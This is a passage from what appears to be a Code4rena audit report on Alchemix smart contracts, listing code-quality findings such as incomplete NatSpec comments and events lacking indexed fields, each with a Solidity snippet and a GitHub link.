#13\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/rocket/IRocketStorage.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/rocket/IRETH.sol (various lines)   #14\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/rocket/IRETH.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/IWethGateway.sol (various lines)   #15\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/IWethGateway.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/maker/IDssProxyActions.sol (various lines)   #16\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/maker/IDssProxyActions.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/IProxyAdmin.sol (various lines)   #17\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/IProxyAdmin.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IALCXSource.sol (various lines)   #18\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IALCXSource.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ITransmuterV1.sol (various lines)   #19\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ITransmuterV1.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IAlchemistV2.sol (various lines)   #20\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IAlchemistV2.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/vesper/IVesperRewards.sol (various lines)   #21\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/vesper/IVesperRewards.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/vesper/IVesperPool.sol (various lines)   #22\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/vesper/IVesperPool.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IStakingPools.sol (various lines)   #23\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IStakingPools.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/compound/ICERC20.sol (various lines)   #24\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/compound/ICERC20.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/compound/IInterestRateModel.sol (various lines)   #25\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/compound/IInterestRateModel.sol\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalGALCX.sol (various lines)   #26\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalGALCX.sol\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalBase.sol (various lines)   #27\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalBase.sol\r\n\r\n### 17. NatSpec is incomplete\r\n\r\n*There are 17 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #1\r\n\r\n/// @audit Missing: '@return'\r\n436       ///\r\n437       /// @param yieldToken The address of the target yield token.\r\n438       function _getTotalBuffered(address yieldToken)\r\n439           internal\r\n440           view\r\n441:          returns (uint256)\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L436-L441\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #2\r\n\r\n/// @audit Missing: '@return'\r\n452       ///\r\n453       /// @param underlyingToken the underlying token whos flow is being updated\r\n454:      function _updateFlow(address underlyingToken) internal returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L452-L454\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Limiters.sol   #3\r\n\r\n/// @audit Missing: '@param _minLimit'\r\n26        /// @dev Instantiates a new linear growth function.\r\n27        ///\r\n28        /// @param maximum The maximum value for the LGF.\r\n29        /// @param blocks  The number of blocks that determins the rate of the LGF.\r\n30        ///\r\n31        /// @return The LGF struct.\r\n32:       function createLinearGrowthLimiter(uint256 maximum, uint256 blocks, uint256 _minLimit) internal view returns (LinearGrowthLimiter memory) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Limiters.sol#L26-L32\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Limiters.sol   #4\r\n\r\n/// @audit Missing: '@param self'\r\n90        /// @dev Get the current value of the linear growth limiter.\r\n91        ///\r\n92        /// @return The current value.\r\n93:       function get(LinearGrowthLimiter storage self) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Limiters.sol#L90-L93\r\n\r\n```solidity\r\nFile: contracts-full/libraries/FixedPointMath.sol   #5\r\n\r\n/// @audit Missing: '@param self'\r\n172     /**\r\n173      * @notice Truncates a fixed point decimal into an unsigned 256-bit integer.\r\n174      *\r\n175      * @return The integer portion of the fixed point decimal.\r\n176      */\r\n177:    function truncate(Number memory self) internal pure returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/FixedPointMath.sol#L172-L177\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Tick.sol   #6\r\n\r\n/// @audit Missing: '@param self'\r\n32      /// @dev Gets the next tick in the buffer.\r\n33      ///\r\n34      /// This increments the position in the buffer.\r\n35      ///\r\n36      /// @return The next tick.\r\n37:     function next(Tick.Cache storage self) internal returns (Tick.Info storage) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Tick.sol#L32-L37\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Tick.sol   #7\r\n\r\n/// @audit Missing: '@param self'\r\n42      /// @dev Gets the current tick being written to.\r\n43      ///\r\n44      /// @return The current tick.\r\n45:     function current(Tick.Cache storage self) internal view returns (Tick.Info storage) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Tick.sol#L42-L45\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Tick.sol   #8\r\n\r\n/// @audit Missing: '@return'\r\n51      /// @param self The reference to the buffer.\r\n52      /// @param n    The nth tick to get.\r\n53:     function get(Tick.Cache storage self, uint256 n) internal view returns (Tick.Info storage) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Tick.sol#L51-L53\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #9\r\n\r\n/// @audit Missing: '@param _data'\r\n34      /// @dev Updates the pool.\r\n35      ///\r\n36      /// @param _ctx the pool context.\r\n37:     function update(Data storage _data, Context storage _ctx) internal {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L34-L37\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #10\r\n\r\n/// @audit Missing: '@param _data'\r\n42      /// @dev Gets the rate at which the pool will distribute rewards to stakers.\r\n43      ///\r\n44      /// @param _ctx the pool context.\r\n45      ///\r\n46      /// @return the reward rate of the pool in tokens per block.\r\n47      function getRewardRate(Data storage _data, Context storage _ctx)\r\n48        internal view\r\n49:       returns (uint256)\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L42-L49\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #11\r\n\r\n/// @audit Missing: '@param _data'\r\n54      /// @dev Gets the accumulated reward weight of a pool.\r\n55      ///\r\n56      /// @param _ctx the pool context.\r\n57      ///\r\n58      /// @return the accumulated reward weight.\r\n59      function getUpdatedAccumulatedRewardWeight(Data storage _data, Context storage _ctx)\r\n60        internal view\r\n61:       returns (FixedPointMath.Number memory)\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L54-L61\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #12\r\n\r\n/// @audit Missing: '@param _self'\r\n83      /// @dev Adds an element to the list.\r\n84      ///\r\n85      /// @param _element the element to add.\r\n86:     function push(List storage _self, Data memory _element) internal {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L83-L86\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #13\r\n\r\n/// @audit Missing: '@param _self'\r\n90      /// @dev Gets an element from the list.\r\n91      ///\r\n92      /// @param _index the index in the list.\r\n93      ///\r\n94      /// @return the element at the specified index.\r\n95:     function get(List storage _self, uint256 _index) internal view returns (Data storage) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L90-L95\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #14\r\n\r\n/// @audit Missing: '@param _self'\r\n99      /// @dev Gets the last element in the list.\r\n100     ///\r\n101     /// This function will revert if there are no elements in the list.\r\n102     ///ck\r\n103     /// @return the last element in the list.\r\n104:    function last(List storage _self) internal view returns (Data storage) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L99-L104\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #15\r\n\r\n/// @audit Missing: '@param _self'\r\n108     /// @dev Gets the index of the last element in the list.\r\n109     ///\r\n110     /// This function will revert if there are no elements in the list.\r\n111     ///\r\n112     /// @return the index of the last element.\r\n113:    function lastIndex(List storage _self) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L108-L113\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #16\r\n\r\n/// @audit Missing: '@param _self'\r\n117     /// @dev Gets the number of elements in the list.\r\n118     ///\r\n119     /// @return the number of elements.\r\n120:    function length(List storage _self) internal view returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L117-L120\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #17\r\n\r\n/// @audit Missing: '@param recipient'\r\n1328      /// @dev Unwraps `amount` of `yieldToken` into its underlying token.\r\n1329      ///\r\n1330      /// @param yieldToken       The address of the yield token to unwrap.\r\n1331      /// @param amount           The amount of the underlying token to wrap.\r\n1332      /// @param minimumAmountOut The minimum amount of underlying tokens that are expected to be received from the\r\n1333      ///                         operation.\r\n1334      ///\r\n1335      /// @return The amount of underlying tokens that resulted from the operation.\r\n1336      function _unwrap(\r\n1337          address yieldToken,\r\n1338          uint256 amount,\r\n1339          address recipient,\r\n1340          uint256 minimumAmountOut\r\n1341:     ) internal returns (uint256) {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L1328-L1341\r\n\r\n### 18. Event is missing `indexed` fields\r\nEach `event` should use three `indexed` fields if there are three or more fields\r\n\r\n*There are 111 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2Base.sol   #1\r\n\r\n55:     event Paused(address minter, bool state);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2Base.sol#L55\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2Base.sol   #2\r\n\r\n60:     event SetFlashMintFee(uint256 fee);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2Base.sol#L60\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #3\r\n\r\n41      event PendingGovernanceUpdated(\r\n42        address pendingGovernance\r\n43:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L41-L43\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #4\r\n\r\n45      event GovernanceUpdated(\r\n46        address governance\r\n47:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L45-L47\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #5\r\n\r\n49      event RewardRateUpdated(\r\n50        uint256 rewardRate\r\n51:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L49-L51\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #6\r\n\r\n53      event PoolRewardWeightUpdated(\r\n54        uint256 indexed poolId,\r\n55        uint256 rewardWeight\r\n56:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L53-L56\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #7\r\n\r\n63      event TokensDeposited(\r\n64        address indexed user,\r\n65        uint256 indexed poolId,\r\n66        uint256 amount\r\n67:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L63-L67\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #8\r\n\r\n69      event TokensWithdrawn(\r\n70        address indexed user,\r\n71        uint256 indexed poolId,\r\n72        uint256 amount\r\n73:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L69-L73\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #9\r\n\r\n75      event TokensClaimed(\r\n76        address indexed user,\r\n77        uint256 indexed poolId,\r\n78        uint256 amount\r\n79:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L75-L79\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV1.sol   #10\r\n\r\n19:     event Paused(address minter, bool state);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV1.sol#L19\r\n\r\n```solidity\r\nFile: contracts-full/gALCX.sol   #11\r\n\r\n19:       event ExchangeRateChange(uint _exchangeRate);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/gALCX.sol#L19\r\n\r\n```solidity\r\nFile: contracts-full/gALCX.sol   #12\r\n\r\n20:       event Stake(address _from, uint _gAmount, uint _amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/gALCX.sol#L20\r\n\r\n```solidity\r\nFile: contracts-full/gALCX.sol   #13\r\n\r\n21:       event Unstake(address _from, uint _gAmount, uint _amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/gALCX.sol#L21\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2.sol   #14\r\n\r\n48:     event Paused(address minter, bool state);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2.sol#L48\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2.sol   #15\r\n\r\n53:     event SetFlashMintFee(uint256 fee);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2.sol#L53\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IWhitelist.sol   #16\r\n\r\n9:      event AccountAdded(address account);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IWhitelist.sol#L9\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IWhitelist.sol   #17\r\n\r\n14:     event AccountRemoved(address account);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IWhitelist.sol#L14\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterBuffer.sol   #18\r\n\r\n35:     event SetAlchemist(address alchemist);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterBuffer.sol#L35\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterBuffer.sol   #19\r\n\r\n41:     event SetAmo(address underlyingToken, address amo);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterBuffer.sol#L41\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterBuffer.sol   #20\r\n\r\n47:     event SetDivertToAmo(address underlyingToken, bool divert);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterBuffer.sol#L47\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterBuffer.sol   #21\r\n\r\n53:     event RegisterAsset(address underlyingToken, address transmuter);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterBuffer.sol#L53\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterBuffer.sol   #22\r\n\r\n59:     event SetFlowRate(address underlyingToken, uint256 flowRate);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterBuffer.sol#L59\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterBuffer.sol   #23\r\n\r\n65:     event SetSource(address source, bool flag);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterBuffer.sol#L65\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterBuffer.sol   #24\r\n\r\n68:     event SetTransmuter(address underlyingToken, address transmuter);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterBuffer.sol#L68\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterV2.sol   #25\r\n\r\n10:     event AdminUpdated(address admin);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterV2.sol#L10\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterV2.sol   #26\r\n\r\n15:     event PendingAdminUpdated(address pendingAdmin);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterV2.sol#L15\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterV2.sol   #27\r\n\r\n20:     event Paused(bool flag);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterV2.sol#L20\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterV2.sol   #28\r\n\r\n27      event Deposit(\r\n28        address indexed sender,\r\n29        address indexed owner,\r\n30        uint256 amount\r\n31:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterV2.sol#L27-L31\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterV2.sol   #29\r\n\r\n38      event Withdraw(\r\n39        address indexed sender,\r\n40        address indexed recipient,\r\n41        uint256 amount\r\n42:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterV2.sol#L38-L42\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterV2.sol   #30\r\n\r\n49      event Claim(\r\n50        address indexed sender,\r\n51        address indexed recipient,\r\n52        uint256 amount\r\n53:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterV2.sol#L49-L53\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterV2.sol   #31\r\n\r\n59      event Exchange(\r\n60        address indexed sender,\r\n61        uint256 amount\r\n62:     );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterV2.sol#L59-L62\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/IAToken.sol   #32\r\n\r\n13:     event Mint(address indexed from, uint256 value, uint256 index);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/IAToken.sol#L13\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/IAToken.sol   #33\r\n\r\n21:     event Burn(address indexed from, address indexed target, uint256 value, uint256 index);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/IAToken.sol#L21\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/IAToken.sol   #34\r\n\r\n29:     event BalanceTransfer(address indexed from, address indexed to, uint256 value, uint256 index);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/IAToken.sol#L29\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/ILendingPool.sol   #35\r\n\r\n65:     event Swap(address indexed reserve, address indexed user, uint256 rateMode);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/ILendingPool.sol#L65\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/ILendingPool.sol   #36\r\n\r\n144     event ReserveDataUpdated(\r\n145       address indexed reserve,\r\n146       uint256 liquidityRate,\r\n147       uint256 stableBorrowRate,\r\n148       uint256 variableBorrowRate,\r\n149       uint256 liquidityIndex,\r\n150       uint256 variableBorrowIndex\r\n151:    );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/ILendingPool.sol#L144-L151\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/ILendingPoolAddressesProvider.sol   #37\r\n\r\n12:     event MarketIdSet(string newMarketId);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/ILendingPoolAddressesProvider.sol#L12\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/ILendingPoolAddressesProvider.sol   #38\r\n\r\n20:     event ProxyCreated(bytes32 id, address indexed newAddress);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/ILendingPoolAddressesProvider.sol#L20\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/ILendingPoolAddressesProvider.sol   #39\r\n\r\n21:     event AddressSet(bytes32 id, address indexed newAddress, bool hasProxy);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/ILendingPoolAddressesProvider.sol#L21\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/tether/ITetherToken.sol   #40\r\n\r\n29:     event Issue(uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/tether/ITetherToken.sol#L29\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/tether/ITetherToken.sol   #41\r\n\r\n32:     event Redeem(uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/tether/ITetherToken.sol#L32\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/tether/ITetherToken.sol   #42\r\n\r\n35:     event Deprecate(address newAddress);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/tether/ITetherToken.sol#L35\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/tether/ITetherToken.sol   #43\r\n\r\n38:     event Params(uint256 feeBasisPoints, uint256 maxFee);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/tether/ITetherToken.sol#L38\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ITransmuterBuffer.sol   #44\r\n\r\n31:       event SetAlchemist(address alchemist);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ITransmuterBuffer.sol#L31\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ITransmuterBuffer.sol   #45\r\n\r\n37:       event RegisterAsset(address underlyingToken, address transmuter);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ITransmuterBuffer.sol#L37\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ITransmuterBuffer.sol   #46\r\n\r\n43:       event SetFlowRate(address underlyingToken, uint256 flowRate);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ITransmuterBuffer.sol#L43\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ITransmuterBuffer.sol   #47\r\n\r\n49:       event SetSource(address source, bool 